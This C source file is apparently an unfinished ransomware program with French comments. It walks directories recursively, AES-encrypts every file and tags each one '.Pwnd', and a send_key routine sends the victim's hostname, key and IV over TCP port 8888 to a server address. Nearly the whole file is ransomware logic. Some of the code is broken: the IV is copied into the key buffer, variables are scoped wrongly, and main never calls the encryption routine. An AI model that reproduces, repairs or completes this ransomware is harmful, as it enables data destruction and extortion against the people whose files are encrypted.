#include "ransomlib.h"
#include <dirent.h>
// for socket
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>

void usage();

int is_encrypted(char *filename)
{
	char *ext = strrchr(filename, '.');

	if (strcmp(ext, ".Pwnd") == 0)
	{
		return 1;
	}
	return 0;
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
{
	struct dirent *entry;
	DIR *dir = opendir(name);

	if (!dir)
	{
		printf("Unable to open directory \"%s\".\n", name);
		return;
	}

	while ((entry = readdir(dir)) != NULL)
	{
		if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) // Check si entry n'est pas . ou ..
		{
			// Génère le chemin du fichier/dossier à partir de entry
			char path[100];
			strcpy(path, name);
			strcat(path, "/");
			strcat(path, entry->d_name);

			if (entry->d_type == DT_DIR) // Si entry est un dossier, l'envoie dans listdir()
			{
				listdir(path, iv, key, de_flag);
			}
			else // Si entry est un fichier, le chiffre ou le déchiffre
			{
				if (de_flag == 'e')
				{
					encrypt(key, iv, path);
				}
				else if (de_flag == 'd')
				{
					decrypt(key, iv, path);
				}
			}
		}
	}
	closedir(dir);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv, char *pKey, char *pIv)
{
	// Génération au format binaire
	RAND_bytes(key, sizeKey);
	RAND_bytes(iv, sizeIv);
	// Conversion en hexadécimal
	bytes_to_hexa(key, pKey, sizeKey/2+1);
	bytes_to_hexa(iv, pIv, sizeIv/2+1);
}

int send_key(char *pKey, char *pIv, char * serveraddress )
{
	// Création de la socket
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(8888);
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	// Convertit l'adresse IP en binaire
	inet_pton(AF_INET, serveraddress, &server.sin_addr);

	// Connexion
	connect(sock, (struct sockaddr *)&server, sizeof(server));

	// Envoi du hostname de la cible
	char hostname[256];
	gethostname(hostname, 256);
	send(sock, hostname, BUFSIZE, 0);


	// Envoi de la clé et de l'IV
	send(sock, pKey, BUFSIZE, 0);
	send(sock, pIv, BUFSIZE, 0);
}

int main(int argc, char *argv[])
{
	// Clé & IV au format binaire
	unsigned char key[AES_256_KEY_SIZE];
	unsigned char iv[AES_BLOCK_SIZE];
	// Clé & IV au format hexadécimal (moitié de l'espace nécessaire)
	char pKey[AES_256_KEY_SIZE/2];
	char pIv[AES_BLOCK_SIZE/2];

	if (argc > 1)
	{
		// Arguments: ransom [-d|-e] <key> <iv> chemin
		if (strcmp(argv[1], "-e") == 0)
		{
			if (argc != 3)
			{
				printf("Correct syntax: ransom -e path\n");
				return 0;
			}

			char de_flag = 'e';
			char *path = argv[2];
		}
		else if (strcmp(argv[1], "-d") == 0)
		{
			if (argc != 5)
			{
				printf("Correct syntax: ransom -d key iv path\n");
				return 0;
			}
			char de_flag = 'd';

			if (sizeof(argv[2]) == AES_256_KEY_SIZE/2){
				strcpy(pKey, argv[2]);
			} else {
				printf("Wrong key format");
				return 0;
			}
			
			if (sizeof(argv[3]) == AES_BLOCK_SIZE/2){
				strcpy(pKey, argv[3]);
			} else {
				printf("Wrong key format");
				return 0;
			}

		}
		else
		{ // Si ni -e ni -d -> Erreur
			printf("You must specify -d or -e\n");
		}
	} else {
		printf("You must specify -d or -e\n");
	}

	generate_key(key, sizeof(key), iv, sizeof(iv), pKey, pIv);
	
	send_key(pKey, pIv, "127.0.0.1");
}